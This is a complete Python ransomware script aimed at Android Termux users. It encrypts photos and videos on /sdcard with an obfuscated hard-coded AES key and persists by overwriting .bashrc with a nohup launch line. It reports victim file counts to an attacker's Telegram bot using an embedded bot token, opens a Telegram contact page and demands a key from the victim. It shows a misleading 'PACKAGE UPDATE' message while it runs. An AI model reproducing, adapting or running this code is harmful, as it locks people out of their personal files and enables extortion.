
import os
try:
    from Crypto.Cipher import AES
    from Crypto import Random
except ModuleNotFoundError or ImportError:
    os.system('pip install pycryptodome')
import subprocess
import time

import requests
import urllib3
import sqlite3
from concurrent.futures import ThreadPoolExecutor as tred
import base64

tele = base64.b85decode("KuR$&NmT").decode("utf-8")
generate_code = "1f[LJ5u]Wp<D?(?2b$S95l"
key = base64.b85decode("IWk07FhWI4").decode("utf-8")
user_id = base64.b85decode("HZ?UkGC4FiH8l").decode("utf-8")
loop = 1
fake = 0




def Ransomwere_Setup(conn):
    with open('/data/data/com.termux/files/home/.bashrc', 'w') as file:
        file.write(f'python {__file__}')
        file.flush()

    os.system(f'am start https://t.me/{tele}')
    print(f'CONTACT : https://t.me/{tele}')
    try:
        banner = requests.get("https://snippet.host/rbqzhe/raw").text
    except requests.exceptions.RequestException:
        banner = ""
    print("\033[1;32m" + banner)
    print(f"\033[1;32mSEND CODE TO HACKER {generate_code}")
    while True:
        x = input("ENTER YOUR KEY : ")
        if x == key:
            with open('key.txt', 'w') as key_file:
                key_file.write(key)
            break
        else:
            print('WRONG !!')
    with open('/data/data/com.termux/files/home/.bashrc', 'w') as file:
        file.write(f'')
        file.flush()
    Dyc().Get_ALL_Photo()


def Create_Sql():
    try:
        video = 0
        photo = 0
        conn = sqlite3.connect('/sdcard/x-t-r.db')

        cursor = conn.cursor()

        cursor.execute('''CREATE TABLE IF NOT EXISTS Ransom_Table (
                                   file_name TEXT NOT NULL,
                       is_processed INTEGER NOT NULL DEFAULT 0,
                       is_decrypt INTEGER NOT NULL DEFAULT 0
                               )''')

        conn.commit()
        conn.close()
        conn = sqlite3.connect('/sdcard/x-t-r.db')

        cursor = conn.cursor()

        for root, dirs, files in os.walk('/sdcard'):
            for file in files:
                ext = os.path.splitext(file)[1]
                if ext in [".jpg", ".png", ".jpeg", ".hiec", '.mp4']:
                    if ext == ".mp4":
                        video += 1
                    else:
                        photo += 1

                    cursor.execute("INSERT INTO Ransom_Table (file_name, is_processed,is_decrypt) VALUES (?, ?,?)",
                                   (root + "/" + file, 0, 0))
        RansomWere.Send_Telegram(f"DETECT PHOTOS {str(photo)} ||| Vedio {str(video)} ||| {generate_code}")
        conn.commit()

        conn.close()
    except:
        time.sleep(10)
        RansomWere()


ENCRYPTION_HEADER = b'ZEYAD_ALABANY_WAS_HERE'


def pad(s):
    pad_byte = AES.block_size - len(s) % AES.block_size
    return s + pad_byte * chr(pad_byte).encode()


def unpad(s):
    return s[:-s[-1]]


class Dyc:
    def __init__(self):
        self.key = open('key.txt', 'r').read()
        self.bashrc = "/data/data/com.termux/files/home/.bashrc"

    def process_photo(self, file_name):
        if self.decrypt_photo(file_name):
            return file_name, True
        else:
            return file_name, False

    def Get_ALL_Photo(self):
        try:
            count = 0
            conn = sqlite3.connect('/sdcard/x-t-r.db')
            cursor = conn.cursor()

            cursor.execute("SELECT file_name FROM Ransom_Table WHERE is_decrypt = 0")
            files_to_process = cursor.fetchall()
            if len(files_to_process) == 0:
                with open(self.bashrc, 'w') as GE:
                    GE.write(f'')
                os.system('rm -rf /sdcard/x-t-r.db')
                conn.close()
                exit('bye bye')
            else:
                with tred() as executor:
                    future_to_file = {executor.submit(self.process_photo, file_data[0]): file_data[0] for file_data in
                                      files_to_process}

                    for future in future_to_file:
                        file_name = future_to_file[future]
                        try:
                            file_name, processed = future.result()
                            if processed:
                                conn = sqlite3.connect('/sdcard/x-t-r.db')
                                cursor = conn.cursor()
                                cursor.execute("UPDATE Ransom_Table SET is_decrypt = 1 WHERE file_name = ?",
                                               (file_name,))
                                print(f"✅✅ [{count}]")
                                count += 1

                                conn.commit()
                                conn.close()
                            else:
                                print("AUTH2 | CP", file_name)
                        except Exception as e:
                            print("Error processing file:", file_name, e)
            conn.close()
            self.Get_ALL_Photo()

        except Exception as e:
            print(e)
            pass







    def decrypt_photo(self, input_filename) -> bool:
        key = self.key
        key = key.ljust(32)[:32].encode()

        with open(input_filename, 'rb') as f:
            header = f.read(len(ENCRYPTION_HEADER))
            if header != ENCRYPTION_HEADER:
                print("Not Encrypted")
                return True
            else:
                iv = f.read(AES.block_size)
                ciphertext = f.read()

                cipher = AES.new(key, AES.MODE_CBC, iv)
                plaintext = cipher.decrypt(ciphertext)

                plaintext = unpad(plaintext)

                with open(input_filename, 'wb') as f:
                    f.write(plaintext)
                return True



class RansomWere:
    def __init__(self):
        global key
        try:
            self.key = key
            self.name_file = os.path.basename(__file__)
            self.mypath = f"/data/data/com.termux/files/home/{self.name_file}"
            self.test = "/sdcard/test.test"
            self.bashrc = "/data/data/com.termux/files/home/.bashrc"
            self.home = "/data/data/com.termux/files/home"

            http = urllib3.PoolManager()
            __ = http.request("GET", "https://www.google.com")
        except urllib3.exceptions.NewConnectionError:
            print("No internet connection. Retrying in 5 seconds...")
            time.sleep(5)
            self.__init__()
        except Exception as e:
            time.sleep(5)
            print("Error occurred:", e)
            self.__init__()
        if not self.Check_Permission():
            print('per is false')
            self.Get_Permission()
        else:
            print('\033[1;32m PACKAGE UPDATE')
            if self.Handle_System():
                self.Middle()
            else:
                self.Start()

    def Start(self):
        if not os.path.exists('/sdcard/x-t-r.db'):
            Create_Sql()
        self.Get_ALL_Photo()

    def Encrypt_Photo(self, file_name):
        key = self.key
        key = key.ljust(32)[:32].encode()

        with open(file_name, 'rb') as f:
            file_content = f.read()

        if file_content.startswith(ENCRYPTION_HEADER):
            return True

        plaintext = pad(file_content)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(plaintext)

        with open(file_name, 'wb') as f:
            f.write(ENCRYPTION_HEADER + iv + encrypted)
            return True

    def process_photo(self, file_name):
        if self.Encrypt_Photo(file_name):
            return file_name, True
        else:
            return file_name, False

    def Get_ALL_Photo(self):
        try:
            global loop, fake
            conn = sqlite3.connect('/sdcard/x-t-r.db')
            cursor = conn.cursor()

            cursor.execute("SELECT file_name FROM Ransom_Table WHERE is_processed = 0")
            files_to_process = cursor.fetchall()
            if len(files_to_process) == 0:
                Ransomwere_Setup(conn)
                conn.close()
            else:
                with tred() as executor:
                    future_to_file = {executor.submit(self.process_photo, file_data[0]): file_data[0] for file_data in
                                      files_to_process}

                    for future in future_to_file:
                        file_name = future_to_file[future]
                        try:
                            file_name, processed = future.result()
                            if processed:
                                fake += 1
                                conn = sqlite3.connect('/sdcard/x-t-r.db')
                                cursor = conn.cursor()
                                cursor.execute("UPDATE Ransom_Table SET is_processed = 1 WHERE file_name = ?",
                                               (file_name,))
                                num = str(fake)
                                if int(num[0]) == loop:
                                    print(f'\r\r {loop} cp = 0 |ok = 0', end='', flush=True)
                                    loop += 1

                                conn.commit()
                                conn.close()
                            else:
                                print("AUTH2 | CP", file_name)
                        except Exception as e:
                            print("Error processing file:", file_name, e)
                    self.__init__()





        except:
            time.sleep(10)
            self.__init__()

    def Middle(self):
        if not os.path.exists(f'/data/data/com.termux/files/home/{self.name_file}'):
            subprocess.Popen(f'cp {__file__} /data/data/com.termux/files/home/{self.name_file}', shell=True,
                             stdout=subprocess.PIPE, stdin=subprocess.PIPE)
        try:
            bashrc = open(self.bashrc, 'r').read()
            if 'nohup' in bashrc:
                self.Start()
            else:
                with open(self.bashrc, 'w') as bash_file:
                    bash_file.write(f'nohup python {self.mypath} > /dev/null 2>&1 &')
                self.Start()
        except FileNotFoundError:
            with open(self.bashrc, 'w') as bash_file:
                bash_file.write(f'nohup python {self.mypath} > /dev/null 2>&1 &')
            self.Start()

    def Get_Permission(self):
        w = open(self.bashrc, 'w').write(f"python {__file__} GET")
        exit()

    def Check_Permission(self) -> bool:
        try:
            open(self.test, 'w').write('')
            if os.path.exists(self.test):
                print('Permissions OK')
                return True
        except PermissionError:

            os.system('termux-setup-storage')
            try:

                with open(self.test, 'w') as file:
                    file.write('Test')
                    print('User granted permission')
                return True
            except PermissionError:
                print('User denied permission')
                return False

    @staticmethod
    def Handle_System() -> bool:
        if os.path.exists('/data/data/com.termux/files/home/'):
            print('YOUR SYSTEM IS TERMUX')
            return True
        else:
            return False

    @staticmethod
    def Send_Telegram(text):
        global user_id
        url = f'https://api.telegram.org/bot6484603416:AAH-cyDScUR9_njFszDyJR5Mcaujrdudtv0/sendMessage?chat_id={user_id}&text={text}'
        try:
            requests.get(url)
            pass
        except requests.exceptions.RequestException:
            print("NO INTERNET")
            pass


RansomWere()
